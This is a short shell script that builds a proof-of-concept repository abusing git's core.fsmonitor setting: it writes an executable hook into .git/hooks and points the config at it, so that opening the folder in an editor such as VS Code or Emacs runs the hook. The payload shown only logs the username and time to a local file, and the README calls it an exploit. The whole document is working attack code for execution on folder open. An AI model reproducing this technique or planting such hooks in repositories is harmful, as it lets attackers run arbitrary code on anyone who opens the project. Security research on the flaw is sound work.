git init
mkdir -p execution

cat > .git/hooks/fsmonitor-watchman << 'HOOK'
#!/bin/bash

whoami >> "$(pwd)/execution/executed.txt"
echo "Exploit executed at: $(date)" >> "$(pwd)/execution/executed.txt"

echo "2"
printf "\0"
HOOK

chmod +x .git/hooks/fsmonitor-watchman

git config core.fsmonitor '.git/hooks/fsmonitor-watchman'

cat > .gitignore << 'EOF'
__pycache__/
*.pyc
dist/
build/
.vscode/
.idea/
EOF

cat > README.md << 'EOF'
# PoC Demo
Git FSMonitor exploit - just open in VS Code or Emacs.
EOF

cat > main.py << 'EOF'
def main():
    print("Git FSMonitor PoC")
if __name__ == "__main__":
    main()
EOF
